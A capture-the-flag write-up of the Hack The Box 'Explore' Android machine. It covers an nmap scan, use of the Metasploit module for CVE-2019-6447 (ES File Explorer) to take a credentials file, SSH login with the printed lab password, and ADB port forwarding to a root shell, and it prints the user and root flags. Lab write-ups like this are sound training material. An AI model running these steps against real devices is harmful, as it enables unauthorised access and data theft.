# Explore
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cfac66b6-069f-45aa-b7ad-9ccd6e73e621)

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.10.247 --min-rate 1000    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-03 06:41 PDT
Nmap scan report for 10.10.10.247
Host is up (0.027s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 7190e3a7c95d836634883debb4c788fb (RSA)
5555/tcp  filtered freeciv
43885/tcp open     unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 03 Oct 2023 13:42:03 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Tue, 03 Oct 2023 13:42:03 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Tue, 03 Oct 2023 13:42:08 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 03 Oct 2023 13:42:24 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 03 Oct 2023 13:42:08 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 03 Oct 2023 13:42:24 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 03 Oct 2023 13:42:24 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 03 Oct 2023 13:42:24 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.93%I=7%D=10/3%Time=651C1A2B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port43885-TCP:V=7.93%I=7%D=10/3%Time=651C1A2A%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x20
SF:03\x20Oct\x202023\x2013:42:03\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Tue,\x2003\x20Oct\x202023\x2013:4
SF:2:03\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2003\x20Oct\x202023\x
SF:2013:42:08\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Tue,\x2003\x20Oct\x202023\x2013:42:08\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Tue,\x2003\x20Oct\x202023\x2013:42:24\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2003\x20Oct\x
SF:202023\x2013:42:24\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x200
SF:3\x20Oct\x202023\x2013:42:24\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Tue,\x2003\x20Oct\x202023\x2013:42:24\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.31 seconds
```

1. Based from the nmap results, the machine opens several tcp ports.

```
2222 --> ssh
5555 --> freeciv (filtered)
43885 --> unknown
59777 --> http
```

2. Checking the filtered port shall resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/56400d55-4170-42e3-b6a7-edd06393512a)


3. It's quite clear the objective in this chall is **Android Exploitation** (judging from the machine's OS).
4. Anyway, now we know the filtered port is being used by Android Debug Bridge (ADB).
5. If you are not familiar with **adb**, in short **adb** is a command line tool which allows user to communicate with an Android device.
6. But since it filtered, it means nmap failed to determine whether it opens or closed.
7. Filtered port indicates that a request packet was sent, but the host did not respond and is not listening.
8. Searching for the unknown port's service resulting to none.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1d5c31b7-d044-435a-abfc-b225adcccd59)


9. Accessing port 59777 (http), shall resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/15f265d8-583a-40cc-9546-adacb175b53e)


10. Searching on the internet about port 59777 found a CVE documentation about it.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c6702d44-51f2-474a-b9f2-477b5f8249b3)


> USING SEARCHSPLOIT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/952cb484-4426-49b6-8f67-3772f7316905)


11. You can use either [this](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln) github POC or metasploit.
12. I solved it with metasploit, simply run `use CVE-2019-6447` to use it.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a9f0fbbb-321f-4b24-af75-87498a952f06)


13. It seems we just need to specify the remote host.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f97776d5-5d81-449b-a165-6926feb895fa)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3dbfb07e-b520-406c-8624-46799cdd11bf)


14. To check what actions we can do, simply run --> `show actions`.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d9b1e868-f81b-41ec-9335-7f5349bf4b08)


15. To set action simply run --> `set action <action_name>`.
16. Long story short, found a finding! (a cred).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a27fae79-b014-4d64-9694-43e57087589f)



17. To dump it we can use **GETFILE** option and set the **ACTIONITEM** with the item's path.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/04489403-af35-4a6c-b61f-b739ebeb6ab5)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/20bfef08-ae83-4726-a9d1-2e00bb1fc65e)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/df610772-3fe7-491b-8ab7-0fabbfceba28)


18. Awesome! Let's run ssh login --> `kristi:Kr1sT!5h@Rp3xPl0r3!`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dedd726e-e8fe-4251-8b75-00bb3150e618)


19. If you countered the same problem as me, simply add --> `-oHostKeyAlgorithms=+ssh-rsa`.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/224f8b6b-b66f-4df0-8165-58a26160b124)


> GETTING THE USER FLAG (usually located inside /storage/emulated/0/) (remember the user's image also stored here, hence the /home for user might be also here).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fdedeaf2-d775-4aac-9556-a6e764a5c920)


## USER FLAG

```
f32017174c7c7e8f50c6da52891ae250
```

20. Remembering port 5555 is filtered before, that should be our interest. We can do port forwarding and access it with our local adb.

> CHECKING WHETHER IT STILL LISTENING OR NOT.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/37765572-4079-43fd-8d31-8f3aad8fb29b)


#### TODO:

```
Run ssh again but this time with port forwarding command.
-> ssh -L 5555:127.0.0.1:5555 kristi@explore.htb -p 2222 -oHostKeyAlgorithms=+ssh-rsa

connect our local adb tool with port 5555 at localhost.
-> adb connect 127.0.0.1:5555
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0a04f5a4-4994-434f-91f7-05f58cefb3de)


> RUN ADB SHELL -> `adb -s 127.0.0.1:5555 shell`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9572167c-2ef8-4619-b9ed-64b31a19581e)


21. We gained root!

> GETTING ROOT FLAG --> located at `/data/root.txt`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6b2a316b-5ae5-4d23-98a8-fa52a3eca407)


## ROOT FLAG

```
f04fc82b6d49b41c9b08982be59338c5
```

